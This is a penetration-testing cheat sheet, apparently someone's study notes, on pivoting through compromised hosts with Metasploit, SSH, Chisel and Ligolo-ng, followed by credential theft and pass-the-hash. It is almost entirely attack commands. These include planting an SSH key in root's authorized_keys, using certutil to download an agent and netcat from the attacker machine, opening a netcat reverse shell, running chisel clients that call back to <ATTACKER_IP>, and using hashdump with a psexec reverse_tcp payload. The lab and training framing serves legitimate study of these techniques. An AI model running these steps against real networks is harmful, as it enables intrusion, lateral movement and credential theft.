
---

## Pivoting and Internal Network Scan

Pivoting allows us to move through the internal network easily and quickly, exploiting new hosts.  
### SCENARIO I (ssh, metasploit)
 You had gained **`root`** privilege over the **Linux Server** and conducted a **[host discovery](https://linuxhint.com/nmap-host-discovery-process/)** in the internal network that only the compromised host has access to. Now you want to **pivot through this host**. How to do it quickly?
![hot potato](https://miro.medium.com/v2/resize:fit:700/1*C7AQyP6h5rOKR2tCmvjzpg.png)
####  **Metasploit** 

 ** IP forwarding  **
```bash
### ON YOUR HOST IN MSFCONSOLE (10.10.10.1)
# PIVOT USING ROUTE COMMAND
route add 123.123.123.0/24 2
# PIVOT USING AUTOROUTE
use post/multi/manage/autoroute
set session 2
run
# PIVOT USING AUTOROUTE IN METERPRETER SESSION
meterpreter> run autoroute -s 123.123.123.0/24
#Check routes
meterpreter> run autoroute -p

#Port Scanning via Pivot:
### ON YOUR HOST IN MSFCONSOLE (10.10.10.1)
# CONDUCT TCP CONNECT SCAN
use auxiliary/scanner/portscan/tcp
set RHOSTS 123.123.123.0/24
set PORTS 1-1024
set THREADS 50
run

# If you want to connect with RDP using Metasploit Framework as a tunnel:
### METASPLOIT TUNNEL FROM LOCALHOST TO 123.123.123.1 FOR RDP
portfwd add –l 3389 –p 3389 –r 123.123.123.1
### CONNECT USING TUNNEL
rdesktop 127.0.0.1:3389
```

    
```bash
* **Proxy Setup (Metasploit + Proxychains):**
    - Set up Metasploit SOCKS4 proxy:
      - Module: `auxiliary/server/socks4a`
      - Set SRVHOST & SRVPORT (default is port 1080).
    - Configure Proxychains:
      - Update `/etc/proxychains.conf`: `socks4 127.0.0.1 1080`
      - check the proxy is running  ->` /meterpreter> jobs`  
    - Example command:
      - `proxychains nmap -sT -Pn -n <target IP> --top-ports 50` 
* **Access Services via Proxychains:**
    - SSH: `proxychains ssh <target IP>`
    - Telnet: `proxychains telnet <target IP>`
```


#### SSH

##### **SSH Dynamic Port Forwarding (SOCKS Proxy)**  

```bash
### ON YOUR MACHINE (10.10.10.1)
# CREATE A DIRECTORY FOR MANAGING KEYS
mkdir piv_keys && chmod 700 piv_keys
# GENERATE NEW SSH KEY
ssh-keygen -f piv_keys/id_rsa_1
# COPY PUBLIC KEY CONTENT TO CLIPBOARD
cat piv_keys/id_rsa_1 | clip.exe # OR JUST CAT AND COPY
### ON A COMPROMISED MACHINE (10.10.10.2)
# ADD YOUR SSH PUBLIC KEY TO authorized_keys
echo "ssh-rsa AAAA...[REDACTED]..." >> /root/.ssh/authorized_keys
### ON YOUR HOST (10.10.10.1)
# START SSH DYNAMIC PORT FORWARDING
ssh -D 9999 -f -N root@10.10.10.2 -i piv_keys/id_rsa_1

## Setup PROXYCHAINS 

### ON YOUR HOST (10.10.10.1)
# CONFIGURE PROXYCHAINS (/etc/proxychains4.conf)
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5  127.0.0.1 9999

# scan
proxychains rdesktop 10.10.10.3
```

***Local Port Forwarding (L2R)***
```bash
# Forward traffic from your machine to a remote service
#ssh
ssh -L [local_port]:[ip_pc_3]:[port_pc3] [username-pc2]@[ssh_server_pc2] 
ssh -L 9999:10.10.10.3:3389 user@remote_server
```

 **Remote Port Forwarding (R2L)**  (we don't use this in pivoting)
- Expose **local service** to a **remote machine**.  
  `ssh -R <remote-port>:localhost:<local-port> user@<remote-host>`

**Key Differences Between Forwarding Types**  


**Key Differences Between Forwarding Types**  

| **Type**            | **Direction**                 | **Purpose**                       | **Example**                       |
|---------------------|--------------------------------|-----------------------------------|-----------------------------------|
| **Local (L2R)**     | Local → Remote                | Access remote service from local | RDP forwarded to `127.0.0.1:3333` |
| **Remote (R2L)**    | Remote → Local                | Expose local service to remote   | Web server accessible remotely   |
| **Dynamic (SOCKS)** | Local → Multiple destinations | Route traffic dynamically via SSH | ProxyChains over SOCKS5 proxy    |

### SCENARIO II (no SSH )
You had managed to pivot through a compromised host (**`123.123.123.2`**) and **gained a low privileged user** **`CRIMSON\bofer`** on the **Windows Server** (**`123.123.123.3`**). During the investigation of the newly compromised host, you found that you can leverage the [buffer overflow vulnerability](https://karol-mazurek95.medium.com/space-challenge-pwn-htb-4bc70c503537) that lies in the **`printer.exe`**(service running on **`127.0.0.1:4444`**) for **privilege escalation** to **`NT AUTHORITY\SYSTEM`** **.** You downloaded the vulnerable **`printer.exe`** to your machine, develop an exploit, and wonder how to send it from your **host** (**`10.10.10.1`**) to the **Windows Server** (**`123.123.123.3`**) service **`printer.exe`** running on the [loopback interface](https://www.juniper.net/documentation/en_US/junos/topics/concept/interface-security-loopback-understanding.html#:~:text=The%20loopback%20interface%20is%20used,the%20loopback%20address%20never%20changes.) (**`127.0.0.1:4444`**)?


![hot potato](https://miro.medium.com/v2/resize:fit:700/1*Eb2avuP0sLLn6NM6JLxBTw.png)

> solution is use ==previously established SSH tunnel  with ProxyChains== (==10.10.10.2==) +  using ***local  loopback port forwarding*** (~~**proxychains ssh -L 1234:127.0.0.1:4444 bofer@123.123.123.3**~~) but we don't have ssh and we can't run it so we will use another tool called ***Chisel*** 
### chisel

***Local loopback Port Forwarding***

```bash
### ON YOUR HOST (10.10.10.1)
# START CHISEL SERVER ON PORT 8000
proxychains chisel server -p 8000 --reverse
# START NETCAT LISTENER ON PORT 4000
nc -nlvp 4000
### ON A COMPROMISED MACHINE (123.123.123.3) 
# START CHISEL CLIENT 
chisel.exe client 10.10.10.1:8000 R:4000:127.0.0.1:4444

``` 

![pic](https://miro.medium.com/v2/resize:fit:700/1*jlorgqQE_tR24qYKmOiJdQ.png)
>Now, if you want to exploit buffer overflow on the vulnerable service available only on **`127.0.0.1:4444`** for the **`123.123.123.3`** from your machine (**10.10.10.1**), you have to run a developed exploit against `10.10.10.1:4000` on your host.

![exploit](https://miro.medium.com/v2/resize:fit:700/1*x_-gMsWfPyR-yGeznyzIEw.png)


other usage:
```bash
# --- SOCKS Proxy for Pivoting

# On Attacker:
chisel server --reverse --port 8000 --socks5
# On Victim:
chisel client <ATTACKER_IP>:8000 R:socks
# Use with proxychains:
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
proxychains nmap -sT -Pn <TARGET_IP>
 

# Port Forwarding

# --- Reverse Port Forwarding (RDP Example)
# Forward Victim:3389 to Attacker:1234 (RDP)
# On Attacker:
chisel server --reverse --port 8000
# On Victim:
chisel client <ATTACKER_IP>:8000 R:1234:<Victimr_IP>:3389
# Connect: rdesktop 127.0.0.1:1234

#NORMALE MODE 
# (anythig  come to:4444)  --> Victim (localhost:5555)--> (Chisel Reverse Tunnel)
#---> back to attacker:4444
chisel client <ATTACKER_IP>:8000 0.0.0.0:4444:<Victimr_IP>:5555


``` 

### logolo-ng 

```bash
#Pivoting with Ligolo-ng  

- **Pivoting**: Use compromised systems to access otherwise unreachable networks.  
- **Tunnels**: Create secure connections to bypass network restrictions.  

## Ligolo-ng Overview  
- Establishes tunnels with **reverse TCP/TLS** using a tun interface (no need for SOCKS or proxychains).  
- Components:  
  - **Proxy**: Runs on your local machine to receive connections from compromised systems.  
  - **Agent**: Deployed on the target machine for command execution.  

## Key Options  

### Proxy Options:  
- `-laddr`: Listening address (default `0.0.0.0:11601`).  
- `-selfcert`: Generate self-signed certificates dynamically.  
- `-v`: Enable verbose mode.  

### Agent Options:  
- `-connect`: Target (domain:port).  
- `-retry`: Auto-retry on error.  
- `-socks`: SOCKS5 proxy settings (optional).  
- `-ignore-cert`: Ignore TLS certificate validation (for debugging only).  

## Lab Setup  
- Created 4 Virtual Networks with different **subnets**.  
- Configured **4 Windows VMs**, each connected to multiple subnets.  
- **Attacker Machine (Kali)** connected to `192.168.232.0`.  

### Subnet Connections  
1. **Ligolo-1**: `192.168.232.153/24`  
1. **Ligolo-1**: `192.168.232.0` & `192.168.8.0`  
2. **Ligolo-2**: `192.168.119.0` & `192.168.8.0`  
3. **Ligolo-3**: `192.168.119.0` & `192.168.79.0`  
4. **Ligolo-4**: `192.168.21.0` & `192.168.79.0`  


### Ligolo-ng Pivoting Commands Cheat Sheet  

################################################
1. `Ligolo-1`: `192.168.232.133` & `192.168.8.129` 
################################################
#1.Upload Ligolo Agent on The Compromised Machine
`python -m http.server # on attcker machine`

`certutil.exe -urlcache -f "http://192.168.232.153:8000/agent.exe" agent.exe` #on Ligolo-1

#2.Setup Tun Interface on Kali:
`sudo ip tuntap add user "your-Kali-User" mode tun ligolo`  
`sudo ip link set ligolo up`  

#3.Start Ligolo Proxy on Kali:  
`./proxy --selfcert`  

#4.execute Ligolo Agent to Compromised Machine:  
`.\agent.exe -ignore-cert -connect 192.168.232.153:11601`  

#5.Interact with Sessions via Ligolo Proxy**:  
`session` #1 Ligolo-1 
`ifconfig` #192.168.8.129
`start` #establishing a connection between kai & Ligolo-1 

#6.Add Route to New Subnet on Kali**:  
`sudo ip route add 192.168.8.0/24 dev ligolo`  

#7.Ping the New Subnet:  
`ping 192.168.8.129` 

#8.Ping Sweep to Discover Hosts:  
for i in {1..254} ;do (ping -c 192.168.8.$i | grep "from" &) ;done 
###########################################
#=>(Found : Ligolo-2 Machine 192.168.8.130) 
#=> exploit RCE on Ligolo-2
##########################################

# [+] # upload netcat and establish a reverse shell on Ligolo-2
# [-] kali -----> Ligolo-2 # we  connect to kali from Ligolo-2
# [-] kali <-- X -- Ligolo-2 # we can't connect to kali from Ligolo-2

# To resolve this issue we need to set up a listener in Ligolo's proxy: Essentially, this listener will be responsible for forwarding traffic from port 8080 on the compromised machine to port 80 on our local Kali machine.

+------------------------------------------------------------+
| Compromised Machine (Ligolo-2)                             |
| IPs:  192.168.119.128  /  192.168.8.130                    |
|                                                            |
+------------------------------------------------------------+
                |
                | 192.168.8.129:8080
                v
+------------------------------------------------------------+
| Compromised Machine (Ligolo-1)                             |
| IPs: 192.168.232.133 / 192.168.8.129                       |
| [+] Logolo-ng Agent  & pivot machine                       |
+------------------------------------------------------------+
                |
                | (Traffic Forwarding)
                v
+------------------------------------------------------------+
| Ligolo Proxy Listener                                      |
| listener_add — addr 0.0.0.0:8080 — to 127.0.0.1:80 — tcp   |
+------------------------------------------------------------+
                |
                | (Traffic Received) 192.168.232.153:80
                v
+------------------------------------------------------------+
| Kali Machine                                                |
| IP: 192.168.232.153                                         |
| [+] Logolo-ng PROXY                                         |
+------------------------------------------------------------+

#9.Create Listener in Ligolo Proxy:  
`listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80 --tcp`  

#10.upload Netcat to Ligolo-2 via Jump Host (Ligolo-1):
#Use Ligolo-1’s IP and port 8080 to transfer files.  
`certutil.exe -urlcache -f "http://192.168.232.153:8000/nc.exe" nc.exe` #on Ligolo-2 

#11.Create a New Listener for Reverse Shell:  
#we will use the same technique from earlier we will create a new listener and execute Netcat along with the IP of the Ligolo-1 Machine(Jump Host) and the port we specify with the listener
`listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:444 --tcp`  

#12.Execute Reverse Shell from Ligolo-2 to Kali:
`nc -lnvp 444` # on kali 
`nc 192.168.8.129 4444 -e /bin/bash`  #on Ligolo-2(Use Ligolo-1 IP and configured port)
'++++++++++++++++++++++++++++++++++++++++++++++++'
successfully gaining access to Ligolo-2 machine |
'++++++++++++++++++++++++++++++++++++++++++++++++'

 
```
## Exploitation  
#### extract credentials
```bash
# extract cred of clint service/ softwares
meterpreter > run post/multi/gather/filezilla_client_cred

```

#### Pass-the-Hash Attack
- **Weakness**: Windows authentication protocols allow users to log in using hashed versions of passwords (NT or LM hashes) instead of cleartext passwords.  
- **Attack Vector**: If the same password is used across multiple machines, obtaining the hash from one host grants access to others, even without knowing the actual password.

* **Tools for Pass-the-Hash**  
- Metasploit and other tools are available to exploit this Windows weakness.  
- You only need the hashes, not the cracked passwords.

* **Dumping Hashes**  
- **Command**:  
  ```bash
  meterpreter > hashdump
  ```

* **Pass-the-Hash with Metasploit (psexec Module)**  
To run a pass-the-hash attack using the `psexec` module:

- **Configure the Module**:
  - **RHOST**: Target host (e.g., 10.10.10.5)
  - **SMBUser**: User account (e.g., els)
  - **SMBPass**: Password hash
  - **Payload**: Meterpreter or custom payload

- **Commands**:
  ```bash
  use exploit/windows/smb/psexec
  set RHOST 10.10.10.5
  set SMBUser els
  set SMBPass <NTLM hash>
  set PAYLOAD windows/meterpreter/reverse_tcp
  run
  ```

* **Post-Exploitation After Successful Exploit**  
Once you have a meterpreter session on a new machine, repeat the post-exploitation process to gather more information (e.g., services, hosts, networks).  

* **Notes**  
- Use proxychains with socks4a to pivot exploits if Metasploit doesn't have a module for the specific vulnerability.
- 
